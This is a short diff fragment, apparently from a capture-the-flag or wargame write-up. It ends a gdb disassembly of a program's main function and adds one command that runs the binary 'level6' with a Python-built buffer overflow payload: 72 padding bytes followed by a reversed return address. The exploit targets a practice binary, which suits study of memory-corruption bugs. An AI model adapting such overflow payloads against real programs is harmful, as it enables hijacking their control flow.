@@ -50,3 +50,4 @@ Dump of assembler code for function main:
    0x080484d3 <+87>:	ret    
 End of assembler dump.
 (gdb) q
+./level6 $(python -c "print 72 * 'a' + '\x08\x04\x84\x54'[::-1]")
